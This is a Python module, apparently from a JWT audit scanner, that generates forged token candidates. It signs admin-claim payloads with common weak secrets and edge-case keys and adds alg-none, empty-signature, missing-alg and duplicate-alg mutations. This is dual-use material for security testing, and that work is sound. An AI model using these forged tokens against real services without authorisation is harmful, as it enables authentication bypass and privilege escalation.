"""JWT candidate generation and built-in audit dictionaries."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass
from typing import Any

import jwt

COMMON_SECRETS = (
    "secret",
    "changeme",
    "change-me",
    "jwt-secret",
    "jwt_secret",
    "your-secret-key",
    "your-secret-key-change-in-production",
    "your-secret-jwt-key-change-in-production",
    "your-super-secret-jwt-key-change-in-production",
    "your-refresh-token-secret-change-in-production",
)


@dataclass(frozen=True)
class SecretCandidate:
    value: str
    label: str
    kind: str = "secret"


# These are deliberately kept separate from the wordlist. They represent
# verifier edge cases, not passwords an operator is expected to maintain.
EDGE_CASE_KEYS = (
    SecretCandidate("", "built-in:empty-key", "edge-key"),
    SecretCandidate("\x00", "built-in:null-byte-key", "edge-key"),
    SecretCandidate("null", "built-in:literal-null-key", "edge-key"),
)


@dataclass(frozen=True)
class TokenCandidate:
    token: str
    algorithm: str
    header_variant: str
    payload: dict[str, Any]
    secret: SecretCandidate | None
    attack_class: str = "weak-hmac-key"
    label: str | None = None


def build_payloads(
    hostname: str, *, deep: bool = False, now: int | None = None
) -> tuple[dict[str, Any], ...]:
    """Build identity and privilege claim mutations used by active scans."""
    issued_at = int(time.time()) if now is None else now
    expires_at = issued_at + 300
    payloads: list[dict[str, Any]] = [
        {"username": "admin"},
        {"sub": "admin"},
        {"email": "admin@admin.com"},
        {"email": f"admin@{hostname}"},
        {"sub": "admin@admin.com"},
        {"sub": f"admin@{hostname}"},
        {"user": "admin", "role": "admin"},
        {"sub": 1, "role": "admin"},
        {"id": 1, "role": "admin"},
        {"sub": 1, "exp": expires_at, "iat": issued_at},
        {"sub": "admin", "exp": expires_at, "iat": issued_at},
        {"sub": 1, "role": "admin", "exp": expires_at, "iat": issued_at},
        {"user_id": 1, "exp": expires_at},
        {"userId": 1, "exp": expires_at},
        {"admin": True, "exp": expires_at},
        {"is_admin": True, "sub": 1, "exp": expires_at},
        {"sub": "1", "exp": expires_at},
    ]
    for identity in (
        "00000000-0000-0000-0000-000000000001",
        "00000000-0000-0000-0000-000000000000",
        "1",
        "admin",
        "admin@admin.com",
        f"admin@{hostname}",
    ):
        payloads.append({"sub": identity, "exp": expires_at, "iat": issued_at})
    for identity in ("1", "0", "2", "3", "admin"):
        payloads.append({"id": identity, "exp": expires_at, "iat": issued_at})
    if deep:
        payloads.extend(
            [
                {"uid": 1, "scope": "admin", "exp": expires_at},
                {"user": {"id": 1, "role": "admin"}, "exp": expires_at},
                {"permissions": ["*"], "sub": "1", "exp": expires_at},
                {"roles": ["admin"], "sub": "1", "exp": expires_at},
                {"isAdmin": True, "sub": "1", "exp": expires_at},
            ]
        )
    return tuple(payloads)


def default_payloads(now: int | None = None) -> tuple[dict[str, Any], ...]:
    """Return the small payload set used by the safe profile."""
    issued_at = int(time.time()) if now is None else now
    return (
        {"sub": "jwt-audit", "iat": issued_at, "exp": issued_at + 300},
        {"sub": "jwt-audit", "role": "admin", "iat": issued_at, "exp": issued_at + 300},
    )


def _b64url(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def _compact_token(header_json: str, payload: dict[str, Any], signature: str = "") -> str:
    header = _b64url(header_json.encode())
    body = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header}.{body}.{signature}"


def encode_candidate(
    payload: dict[str, Any],
    secret: str,
    *,
    algorithm: str = "HS256",
    header_variant: str = "alg-first",
) -> str:
    """Encode a candidate while preserving selectable header ordering."""
    if algorithm not in {"HS256", "HS384", "HS512"}:
        raise ValueError(f"unsupported HMAC algorithm: {algorithm}")
    if header_variant == "library":
        return jwt.encode(payload, secret, algorithm=algorithm, headers={"typ": "JWT"})
    if header_variant not in {"alg-first", "typ-first"}:
        raise ValueError(f"unsupported header variant: {header_variant}")
    header = (
        {"alg": algorithm, "typ": "JWT"}
        if header_variant == "alg-first"
        else {"typ": "JWT", "alg": algorithm}
    )
    header_part = _b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_part = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{header_part}.{payload_part}"
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[algorithm]
    signature = hmac.new(secret.encode(), message.encode(), digest).digest()
    return f"{message}.{_b64url(signature)}"


def encode_unsigned(payload: dict[str, Any]) -> str:
    return _compact_token('{"alg":"none","typ":"JWT"}', payload)


def generate_algorithm_mutations(
    payload: dict[str, Any], algorithms: tuple[str, ...]
) -> tuple[TokenCandidate, ...]:
    """Return parser/algorithm edge cases that do not require signing material."""
    candidates = [
        TokenCandidate(
            _compact_token(f'{{"alg":"{value}","typ":"JWT"}}', payload),
            value,
            "alg-case-variant",
            payload,
            None,
            "algorithm-manipulation",
            f"alg-{value}",
        )
        for value in ("None", "NONE", "nOnE")
    ]
    candidates.extend(
        TokenCandidate(
            _compact_token(f'{{"alg":"{algorithm}","typ":"JWT"}}', payload),
            algorithm,
            "empty-signature",
            payload,
            None,
            "algorithm-manipulation",
            f"empty-{algorithm}-signature",
        )
        for algorithm in algorithms
    )
    for header, algorithm, variant, label in (
        ('{"typ":"JWT"}', "<missing>", "missing-alg", "missing-algorithm"),
        ('{"alg":null,"typ":"JWT"}', "null", "null-alg", "null-algorithm"),
    ):
        candidates.append(
            TokenCandidate(
                _compact_token(header, payload),
                algorithm,
                variant,
                payload,
                None,
                "algorithm-manipulation",
                label,
            )
        )
    for algorithm in algorithms:
        for header, display, variant, label in (
            (
                f'{{"alg":"none","alg":"{algorithm}","typ":"JWT"}}',
                f"none/{algorithm}",
                "duplicate-alg-first-none",
                "duplicate-algorithm-first-none",
            ),
            (
                f'{{"alg":"{algorithm}","alg":"none","typ":"JWT"}}',
                f"{algorithm}/none",
                "duplicate-alg-last-none",
                "duplicate-algorithm-last-none",
            ),
        ):
            candidates.append(
                TokenCandidate(
                    _compact_token(header, payload),
                    display,
                    variant,
                    payload,
                    None,
                    "algorithm-manipulation",
                    label,
                )
            )
    return tuple(candidates)


def candidate_count(
    payload_count: int,
    secret_count: int,
    *,
    algorithms: tuple[str, ...],
    header_variants: tuple[str, ...],
    include_unsigned: bool,
    include_key_edge_cases: bool = False,
    include_algorithm_mutations: bool = False,
) -> int:
    key_count = secret_count + (len(EDGE_CASE_KEYS) if include_key_edge_cases else 0)
    count = payload_count * key_count * len(algorithms) * len(header_variants)
    if include_unsigned:
        count += payload_count
    if include_algorithm_mutations:
        count += payload_count * (3 * len(algorithms) + 5)
    return count


def generate_candidates(
    payloads: tuple[dict[str, Any], ...],
    secrets: tuple[SecretCandidate, ...],
    *,
    algorithms: tuple[str, ...],
    header_variants: tuple[str, ...],
    include_unsigned: bool,
    include_key_edge_cases: bool = False,
    include_algorithm_mutations: bool = False,
    limit: int | None = None,
) -> tuple[TokenCandidate, ...]:
    candidates: list[TokenCandidate] = []
    if include_unsigned:
        for payload in payloads:
            candidates.append(
                TokenCandidate(
                    encode_unsigned(payload),
                    "none",
                    "alg-none",
                    payload,
                    None,
                    "unsigned",
                    "unsigned-token",
                )
            )
            if limit is not None and len(candidates) >= limit:
                return tuple(candidates)
    if include_algorithm_mutations:
        for payload in payloads:
            for candidate in generate_algorithm_mutations(payload, algorithms):
                candidates.append(candidate)
                if limit is not None and len(candidates) >= limit:
                    return tuple(candidates)
    all_secrets = (*EDGE_CASE_KEYS, *secrets) if include_key_edge_cases else secrets
    for secret in all_secrets:
        for payload in payloads:
            for algorithm in algorithms:
                for variant in header_variants:
                    candidates.append(
                        TokenCandidate(
                            encode_candidate(
                                payload,
                                secret.value,
                                algorithm=algorithm,
                                header_variant=variant,
                            ),
                            algorithm,
                            variant,
                            payload,
                            secret,
                            "key-edge-case"
                            if secret.kind == "edge-key"
                            else (
                                "algorithm-confusion"
                                if secret.kind == "confusion-key"
                                else "weak-hmac-key"
                            ),
                            secret.label,
                        )
                    )
                    if limit is not None and len(candidates) >= limit:
                        return tuple(candidates)
    return tuple(candidates)
